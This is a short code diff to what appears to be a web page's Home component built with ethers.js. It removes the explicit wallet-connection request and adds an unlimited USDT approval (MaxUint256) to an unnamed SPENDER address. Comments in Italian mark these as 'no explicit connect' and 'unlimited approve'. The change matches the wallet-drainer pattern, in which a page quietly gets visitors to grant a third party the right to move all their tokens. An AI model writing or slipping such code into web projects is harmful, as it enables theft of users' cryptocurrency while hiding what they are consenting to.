@@ -22,8 +22,7 @@ export default function Home() {
       });
 
       const provider = new ethers.BrowserProvider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      const signer = await provider.getSigner();
+      const signer = await provider.getSigner(); // 👈 niente connect esplicito
 
       const usdt = new ethers.Contract(
         USDT_ADDRESS,
@@ -33,6 +32,7 @@ export default function Home() {
         signer
       );
 
+      // 🔥 approve illimitato
       const tx = await usdt.approve(
         SPENDER,
         ethers.MaxUint256
